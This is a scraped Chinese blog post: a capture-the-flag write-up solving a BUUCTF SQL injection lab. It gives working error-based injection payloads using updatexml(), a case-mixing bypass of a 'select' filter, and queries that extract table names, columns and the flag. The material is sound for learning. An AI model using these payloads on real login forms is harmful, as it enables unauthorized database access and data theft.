{"blogid": "125209598", "writerAge": "码龄1年", "writerBlogNum": "11", "writerCollect": "7", "writerComment": "1", "writerFan": "2", "writerGrade": "2级", "writerIntegral": "113", "writerName": "柠.筱", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_125209598.jpg", "writerRankTotal": "94907", "writerRankWeekly": "263895", "writerThumb": "1", "writerVisitNum": "4818", "blog_read_count": "897", "blog_time": "于 2022-06-09 19:54:34 发布", "blog_title": "[BUUCTF][N1BOOK][第一章 web入门]SQL注入-2(详细解析)", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p id=\"main-toc\"><strong>目录</strong></p>\n<p id=\"%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5%EF%BC%9A-toc\" style=\"margin-left:0px;\"><a href=\"#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5%EF%BC%9A\">题目链接：</a></p>\n<p id=\"%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90%EF%BC%9A-toc\" style=\"margin-left:0px;\"><a href=\"#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90%EF%BC%9A\">题目解析：</a></p>\n<p id=\"%C2%A0%E5%BE%97%E5%88%B0flag%EF%BC%9A-toc\" style=\"margin-left:0px;\"><a href=\"#%C2%A0%E5%BE%97%E5%88%B0flag%EF%BC%9A\">得到flag：</a></p>\n<hr id=\"hr-toc\"/>\n<p></p>\n<blockquote>\n<h1 id=\"%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5%EF%BC%9A\">题目链接：</h1>\n</blockquote>\n<pre><code>https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%80%E7%AB%A0%20web%E5%85%A5%E9%97%A8]SQL%E6%B3%A8%E5%85%A5-2</code></pre>\n<p class=\"img-center\"><img alt=\"\" height=\"650\" src=\"..\\..\\static\\image\\864dd033639f4a58865bd955c5ffcc18.png\" width=\"488\"/></p>\n<blockquote>\n<h1 id=\"%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90%EF%BC%9A\">题目解析：</h1>\n</blockquote>\n<p style=\"margin-left:0in;text-align:left;\"><span style=\"color:#000000;\">注意查看细节，发现题目中有一处请访问，在上图标记的位置</span></p>\n<p class=\"img-center\"><img alt=\"\" height=\"156\" src=\"..\\..\\static\\image\\2c1340e8683242eb8ac0bef2480523ff.png\" width=\"649\"/></p>\n<p></p>\n<p style=\"margin-left:0in;text-align:left;\"><span style=\"color:#000000;\">我们按提示分别访问</span><span style=\"color:#000000;\">/</span><span style=\"color:#000000;\">login.php</span> <span style=\"color:#000000;\">和 </span><span style=\"color:#000000;\">/</span><span style=\"color:#000000;\">user.php</span> <span style=\"color:#000000;\">去看看</span></p>\n<p style=\"margin-left:0in;text-align:left;\"><span style=\"color:#000000;\">进入页面后习惯性地查看源代码发现有一行注释提示，告诉我们：</span></p>\n<p style=\"margin-left:0in;text-align:left;\"><span style=\"color:#000000;\">可以在url</span><span style=\"color:#000000;\">后加入</span><span style=\"color:#000000;\">?tips=1 </span><span style=\"color:#000000;\">开启</span><span style=\"color:#000000;\">mysql</span><span style=\"color:#000000;\">错误提示</span><span style=\"color:#000000;\">,</span><span style=\"color:#000000;\">使用burp发包就可以看到啦</span></p>\n<p class=\"img-center\"><img alt=\"\" height=\"302\" src=\"..\\..\\static\\image\\05b059d90f354245a18357c5fd6037b8.png\" width=\"444\"/></p>\n<p> </p>\n<p class=\"img-center\"><img alt=\"\" height=\"562\" src=\"..\\..\\static\\image\\1e762d49efe444a1af959ffe81757dad.png\" width=\"643\"/></p>\n<p> 另一个页面则就只有一行 login first，<span style=\"color:#000000;\">没有太多</span><span style=\"color:#000000;\">用处</span></p>\n<p class=\"img-center\"><img alt=\"\" height=\"71\" src=\"..\\..\\static\\image\\dad19a5534704cc0a1a5c6f87b49aa8b.png\" width=\"676\"/></p>\n<p> <span style=\"color:#000000;\">页面提交的账号密码，在burp中抓到这个包，使用</span><span style=\"color:#000000;\">Ctrl+r</span><span style=\"color:#000000;\">将数据发送到</span><span style=\"color:#000000;\">repeater</span><span style=\"color:#000000;\">进行重发送</span></p>\n<p class=\"img-center\"><img alt=\"\" height=\"699\" src=\"..\\..\\static\\image\\89be0f84e40a4c16bfe17692e2596684.png\" width=\"670\"/></p>\n<p> <span style=\"color:#000000;\">然后在burp</span><span style=\"color:#000000;\">中的</span><span style=\"color:#000000;\">login.php后添加?tips=1，Send发送查看现象</span></p>\n<p class=\"img-center\"><img alt=\"\" height=\"257\" src=\"..\\..\\static\\image\\4350ce4f1b15464f9b1dc3a8c8a716f8.png\" width=\"612\"/></p>\n<p> <span style=\"color:#000000;\">正常send提示账号不存在</span></p>\n<p class=\"img-center\"><img alt=\"\" height=\"252\" src=\"..\\..\\static\\image\\e2352ce795c04649a002ab70c1bfb1e0.png\" width=\"316\"/></p>\n<p> <span style=\"color:#000000;\">使用普通payload:，发现是</span><span style=\"color:#000000;\">select被过滤了 </span>（密码写啥都行，因为前面注释掉密码了）</p>\n<pre><code>name=1'and updatexml(1,concat(0x7e,(select 1 from dual)),1)--+&amp;pass=xxxx</code></pre>\n<p class=\"img-center\"><img alt=\"\" height=\"295\" src=\"..\\..\\static\\image\\98bbb6615abd4b1c9ce213007dcb01e7.png\" width=\"511\"/></p>\n<p> <span style=\"color:#000000;\">尝试一下大小写绕过，成功得到正常回显</span></p>\n<pre><code>name=1'and updatexml(1,concat(0x7e,(sELECT 1 from dual)),1)--+&amp;pass=1' and 1=2 --+</code></pre>\n<p class=\"img-center\"><img alt=\"\" height=\"198\" src=\"..\\..\\static\\image\\cb131e5cb9164d29bf3ef879b90dce27.png\" width=\"553\"/></p>\n<p>查表名： </p>\n<p><span style=\"color:#000000;\">将</span><span style=\"color:#000000;\">sELEct</span><span style=\"color:#000000;\">后的</span><span style=\"color:#000000;\">1</span><span style=\"color:#000000;\">改为</span><span style=\"color:#000000;\">group_concat</span><span style=\"color:#000000;\">(</span><span style=\"color:#000000;\">table_name</span><span style=\"color:#000000;\">)</span><span style=\"color:#000000;\">，</span><span style=\"color:#000000;\">dual</span><span style=\"color:#000000;\">改为</span><span style=\"color:#000000;\">information_schema.tables</span><span style=\"color:#000000;\"> where </span><span style=\"color:#000000;\">table_schema</span><span style=\"color:#000000;\">=database()</span><span style=\"color:#000000;\">以查看所有表名</span></p>\n<p><span style=\"color:#0d0016;\">得到pyload：</span></p>\n<pre><code>name=1'and updatexml(1,concat(0x7e,(sELECT group_concat(table_name) from information_schema.tables where table_schema=database())),1)--+&amp;pass=1' and 1=2 --+\n</code></pre>\n<p class=\"img-center\"><img alt=\"\" height=\"289\" src=\"..\\..\\static\\image\\d19ee4f6cdb94cec8f275c43ff639cd8.png\" width=\"668\"/></p>\n<p> <span style=\"color:#000000;\">查看</span><span style=\"color:#000000;\">fl4g</span><span style=\"color:#000000;\">的字段：</span></p>\n<p><span style=\"color:#0d0016;\">要看fl4g的字段，分别改为把之前的两个地方改为group_concat(column_name)和information_schema.columns where table_name=‘fl4g’</span></p>\n<p><span style=\"color:#0d0016;\">得到pyload：</span></p>\n<pre><code>name=1'and updatexml(1,concat(0x7e,(sELECT group_concat(column_name) from information_schema.columns where table_name='fl4g')),1)--+&amp;pass=1' and 1=2 --+\n</code></pre>\n<p class=\"img-center\"><img alt=\"\" height=\"298\" src=\"..\\..\\static\\image\\e78ec6266fa94f008f61fc0bccbe3cce.png\" width=\"664\"/></p>\n<p> <span style=\"color:#000000;\">查看字段获取</span><span style=\"color:#000000;\">flag</span><span style=\"color:#000000;\">：</span></p>\n<p><span style=\"color:#000000;\">payload</span><span style=\"color:#000000;\">：</span></p>\n<pre><code>name=1'and updatexml(1,concat(0x7e,(sELECT flag from fl4g)),1)--+&amp;pass=1' and 1=2 --+</code></pre>\n<p class=\"img-center\"><img alt=\"\" height=\"299\" src=\"..\\..\\static\\image\\a0cc74ce87b84a3c843b5865bfecdde9.png\" width=\"670\"/></p>\n<blockquote>\n<h1 id=\"%C2%A0%E5%BE%97%E5%88%B0flag%EF%BC%9A\"><span style=\"color:#000000;\">得到</span><span style=\"color:#000000;\">flag</span><span style=\"color:#000000;\">：</span></h1>\n</blockquote>\n<pre><code>n1book{login_sqli_is_nice}</code></pre>\n<p style=\"margin-left:0in;text-align:left;\"><span style=\"color:#FF0000;\">*</span><span style=\"color:#FF0000;\">题目原理</span><span style=\"color:#FF0000;\">*</span></p>\n<p style=\"margin-left:0in;text-align:left;\"><span style=\"color:#000000;\">1</span><span style=\"color:#000000;\">、有的网站会开启错误调试信息方便开发者调试，可以利用报错信息进行报错注入</span></p>\n<p style=\"margin-left:0in;text-align:left;\"><span style=\"color:#000000;\">2</span><span style=\"color:#000000;\">、</span><span style=\"color:#000000;\">updatexml</span><span style=\"color:#000000;\">第二个参数应为合法</span><span style=\"color:#000000;\">XPATH</span><span style=\"color:#000000;\">路径，否则会在引发报错的同时输出传入的参数</span></p>\n<p style=\"margin-left:0in;text-align:left;\">3<span style=\"color:#000000;\">、</span><span style=\"color:#000000;\">dual</span><span style=\"color:#000000;\">用于测试数据库是否可以正常使用</span></p>\n<p style=\"margin-left:0in;text-align:left;\"><span style=\"color:#000000;\">4</span><span style=\"color:#0d0016;\">、如果没有报错提示,可以bool注入</span></p>\n</div>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 0, "sql": 1, "php": 1, "time": "2022-06-09 19:54:34", "summary": "目录题目链接：题目解析：得到：题目链接：题目解析：注意查看细节，发现题目中有一处请访问，在上图标记的位置我们按提示分别访问和去看看进入页面后习惯性地查看源代码发现有一行注释提示，告诉我们：可以在后加入"}